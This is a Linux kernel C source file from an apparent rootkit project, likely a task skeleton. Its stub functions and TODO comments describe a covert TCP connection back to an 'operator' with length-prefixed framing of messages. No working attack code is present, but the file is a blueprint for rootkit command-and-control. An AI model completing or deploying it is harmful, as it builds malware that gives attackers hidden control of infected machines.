// SPDX-License-Identifier: GPL-2.0
// network/protocol.c - Length-prefixed framing over TCP (2-byte header).
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/types.h>
#include <net/net_namespace.h>

#include "rootkit.h"

/*
 * TODO: Implement rk_connect.
 *
 * Create a TCP socket with sock_create_kern(&init_net, ...).
 * Fill sockaddr_in from peer_addr_str (in_aton) and peer_port (htons).
 * kernel_connect to the operator. Return socket or ERR_PTR.
 */
struct socket *rk_connect(void)
{
	return ERR_PTR(-ENOSYS);
}

/*
 * TODO: Implement send_exact (static).
 *
 * Send all bytes in a loop using kernel_sendmsg.
 * Handle partial sends. Return bytes sent or negative errno.
 * Return -ECONNRESET if kernel_sendmsg returns 0.
 */

/*
 * TODO: Implement recv_exact (static).
 *
 * Receive exactly len bytes in a loop using kernel_recvmsg.
 * Handle partial receives. Return bytes received or negative errno.
 * Return -ECONNRESET if kernel_recvmsg returns 0.
 */

/*
 * TODO: Implement rk_send_frame.
 *
 * 2-byte big-endian length prefix: __be16 hdr = htons((u16)len).
 * send_exact the 2-byte header, then send_exact the payload.
 * Return -EMSGSIZE if len > RK_FRAME_MAX.
 * Zero-length frames are valid (just the header).
 */
int rk_send_frame(struct socket *sock, const void *buf, size_t len)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_recv_frame.
 *
 * recv_exact 2 bytes for the __be16 header.
 * payload_len = ntohs(hdr).
 * Return -EMSGSIZE if payload_len > max_len.
 * Zero-length: set *out_len = 0, return 0.
 * Otherwise recv_exact payload_len bytes into buf.
 */
int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
		  size_t *out_len)
{
	return -ENOSYS;
}
